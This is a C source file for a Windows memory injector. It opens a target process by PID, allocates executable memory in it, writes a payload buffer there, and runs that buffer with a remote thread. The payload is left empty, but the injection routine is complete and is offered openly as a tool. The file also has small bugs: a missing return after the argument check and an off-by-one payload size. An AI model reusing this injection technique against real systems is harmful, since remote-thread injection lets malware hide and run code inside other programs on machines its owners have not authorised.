/*  injector_win.c
*   A simple memory injector using win32 API 
*   Gabriel Lepinay
*   2025-05-10
*/

#include <windows.h>
#include <stdio.h>

char payload[] = "";

size_t sPayloadSize = sizeof(payload) + 1;

int get_pid(char *cPid) {
    int iPid = atoi(cPid);
    if (iPid == 0)
        return -1;
    return iPid;
}

int main(int ac, char *av[]) {

    if (ac != 2) {
        printf("[-] You must specify a PID.\n./injector <PID>\n\tPID: int\n");
    }

    int iPid = get_pid(av[1]);

    if (iPid == -1) {
        printf("[-] Invalid argument. PID should be an integer.\n");
        return 1;
    }

    HANDLE hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, iPid);

    if (hProcessHandle == NULL) {
        printf("[-] Cannot get handle to process %d: %lu\n", iPid, GetLastError());
        return 1;
    }
    printf("[+] Got handle for process %ld: %p\n", iPid, hProcessHandle);

    void *vpAllocAdd = VirtualAllocEx(
        hProcessHandle,
        NULL,
        sPayloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (vpAllocAdd == NULL) {
        printf("[-] Cannot allocate memory for the injected process: %lu\n", GetLastError());
        CloseHandle(hProcessHandle);
        return 1;
    }
    printf("[+] Allocated %llu bytes at %p\n", sPayloadSize, vpAllocAdd);

    size_t sWrittenBytes;
    if (!WriteProcessMemory(
        hProcessHandle,
        vpAllocAdd,
        payload,
        sPayloadSize,
        &sWrittenBytes
    )) {
        printf("[-] Cannot write payload into process memory: %lu\n", GetLastError());
        CloseHandle(hProcessHandle);
        return 1;
    }
    printf("[+] Written %llu bytes at %p\n", sWrittenBytes, vpAllocAdd);

    DWORD lpThreadId;
    HANDLE hThreadHandle = CreateRemoteThreadEx(
        hProcessHandle,
        NULL,
        0,
        vpAllocAdd,
        NULL,
        0,
        NULL,
        &lpThreadId
    );

    if (hThreadHandle == NULL) {
        printf("[-] Cannot execute payload: %lu\n", GetLastError());
        CloseHandle(hProcessHandle);
        return 1;
    }

    printf("[+] Got handle to the thread with PID: %ld\n", lpThreadId);
    printf("[i] Thread executing...\n");
    WaitForSingleObject(hThreadHandle, INFINITE);
    printf("[i] Thread finish executing...\n");
    printf("[i] Cleaning everything...\n");
    CloseHandle(hProcessHandle);
    CloseHandle(hThreadHandle);
    return 0;
}